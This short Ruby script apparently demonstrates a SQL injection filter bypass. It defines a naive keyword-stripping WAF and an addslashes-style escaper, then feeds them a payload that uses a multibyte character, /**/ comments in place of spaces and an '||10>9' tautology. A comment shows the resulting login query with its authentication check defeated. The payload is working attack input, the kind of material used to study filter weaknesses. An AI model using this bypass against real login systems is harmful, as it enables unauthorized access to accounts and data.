def sqli_waf (str)
    str.gsub(/union|select|where|and|or| |=/i, '')
end

def addslashed (str)
    str.gsub(/['"]/,'\\\\\0')
end

str = "¿'/**/||/**/10>9;/**/--/**/"
# "SELECT * FROM users WHERE username='?\'/**/||/**/10>9;/**/--/**/' and password=' '"
# @params = Hash[params.map { |key, value| [key, sqli_waf(value)] }]
puts addslashed(sqli_waf(str))